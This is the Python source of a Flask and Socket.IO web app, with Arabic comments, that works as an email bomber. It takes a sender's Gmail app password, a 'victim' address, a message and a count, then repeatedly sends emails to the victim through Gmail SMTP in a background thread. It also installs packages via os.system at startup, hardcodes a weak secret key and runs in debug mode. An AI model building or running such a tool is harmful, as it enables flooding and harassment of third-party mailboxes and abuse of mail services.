import os
os.system("pip install flask_socketio")
os.system("pip install SocketIO")
from flask import Flask, render_template, request, session
from flask_socketio import SocketIO, emit
import smtplib
import threading
import time
import uuid
from captcha.image import ImageCaptcha
import random
import os

app = Flask(__name__)
app.secret_key = os.urandom(24)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, async_mode='threading')

# تخزين المهام النشطة
active_tasks = {}

# توليد CAPTCHA
def generate_captcha():
    captcha_text = ''.join(random.choices('ABCDEFGHJKLMNPQRSTUVWXYZ23456789', k=6))
    image = ImageCaptcha().generate(captcha_text)
    return captcha_text, image

@app.route('/')
def index():
    captcha_text, captcha_image = generate_captcha()
    session['captcha'] = captcha_text
    return render_template('index.html', captcha_image=captcha_image.decode('utf-8'))

def send_emails_task(task_id, email_data):
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(email_data['sender_email'], email_data['app_password'])
        
        for i in range(email_data['number']):
            if active_tasks[task_id]['stop']:
                break
            
            msg = f"Subject: {email_data['subject']}\n\n{email_data['message']}"
            server.sendmail(email_data['sender_email'], [email_data['victim_email']], msg)
            
            socketio.emit('progress_update', {
                'current': i+1,
                'total': email_data['number'],
                'task_id': task_id
            }, room=task_id)
            time.sleep(1)
            
        server.quit()
        active_tasks[task_id]['status'] = 'completed' if not active_tasks[task_id]['stop'] else 'stopped'
        
    except Exception as e:
        active_tasks[task_id]['status'] = f'error: {str(e)}'
    finally:
        socketio.emit('task_complete', {'task_id': task_id}, room=task_id)

@socketio.on('start_task')
def handle_start_task(data):
    task_id = str(uuid.uuid4())
    active_tasks[task_id] = {
        'stop': False,
        'status': 'running',
        'thread': None
    }
    
    # التحقق من CAPTCHA
    if data['captcha'].upper() != session.get('captcha', '').upper():
        emit('captcha_error', {'message': 'رمز التحقق غير صحيح'})
        return
    
    # بدء المهمة في ثانٍية منفصلة
    email_data = {
        'sender_email': data['email'],
        'app_password': data['password'],
        'victim_email': data['victim'],
        'subject': data['subject'],
        'message': data['message'],
        'number': int(data['number'])
    }
    
    thread = threading.Thread(target=send_emails_task, args=(task_id, email_data))
    active_tasks[task_id]['thread'] = thread
    thread.start()
    
    emit('task_started', {'task_id': task_id})

@socketio.on('stop_task')
def handle_stop_task(data):
    task_id = data['task_id']
    if task_id in active_tasks:
        active_tasks[task_id]['stop'] = True
        emit('task_stopped', {'task_id': task_id}, room=task_id)

if __name__ == '__main__':
    socketio.run(app, debug=True)